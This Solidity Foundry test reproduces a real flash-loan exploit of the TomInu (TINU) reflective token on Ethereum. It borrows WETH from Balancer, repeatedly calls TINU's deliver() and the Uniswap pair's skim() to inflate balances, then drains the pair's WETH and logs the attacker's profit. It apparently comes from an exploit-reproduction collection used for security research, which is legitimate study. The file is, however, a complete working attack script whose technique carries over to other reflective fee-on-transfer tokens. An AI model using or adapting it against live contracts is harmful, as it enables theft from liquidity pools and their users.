// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Total lost: 22 ETH
// Attacker: 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195
// Attack Contract: 0xdb2d869ac23715af204093e933f5eb57f2dc12a9
// Vulnerable Contract: 0x2d0e64b6bf13660a4c0de42a0b88144a7c10991f
// Attack Tx: https://phalcon.blocksec.com/tx/eth/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668
//            https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668

// @Analysis
// https://twitter.com/libevm/status/1618731761894309889

contract TomInuExploit is Test {
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);

    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IRouter private constant router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);

    function testHack() external {
        vm.createSelectFork("https://eth.llamarpc.com", 16_489_408);

        // flashloan WETH from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 104.85 ether;

        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        reflectiveERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        // swapp WETH for TINU to give Pair large fees
        WETH.approve(address(router), type(uint256).max);
        TINU.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TINU);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            104.85 ether, 0, path, address(this), type(uint256).max
        );

        console.log("%s TINU in pair before deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
        console.log("%s TINU in attack contract before deliver", TINU.balanceOf(address(this)) / 1e18);
        console.log("-------------Delivering-------------");

        TINU.deliver(TINU.balanceOf(address(this))); // give away TINU

        console.log("%s TINU in pair after deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
        console.log("%s TINU in attack contract after deliver", TINU.balanceOf(address(this)) / 1e18);
        console.log("-------------Skimming---------------");

        TINU_WETH.skim(address(this));

        console.log("%s TINU in pair after skim", TINU.balanceOf(address(TINU_WETH)) / 1e18);
        console.log("%s TINU in attack contract after skim", TINU.balanceOf(address(this)) / 1e18);
        console.log("-------------Delivering-------------");

        TINU.deliver(TINU.balanceOf(address(this)));

        console.log("%s TINU in pair after deliver 2", TINU.balanceOf(address(TINU_WETH)) / 1e18);
        console.log("%s TINU in attack contract after deliver 2", TINU.balanceOf(address(this)) / 1e18);
        // WETH in Pair always = 126

        TINU_WETH.swap(0, WETH.balanceOf(address(TINU_WETH)) - 0.01 ether, address(this), "");

        // repay
        WETH.transfer(address(balancerVault), amounts[0]);

        console.log("\n Attacker's profit: %s WETH", WETH.balanceOf(address(this)) / 1e18);
    }
}

/* -------------------- Interface -------------------- */
interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function deliver(uint256 tAmount) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}
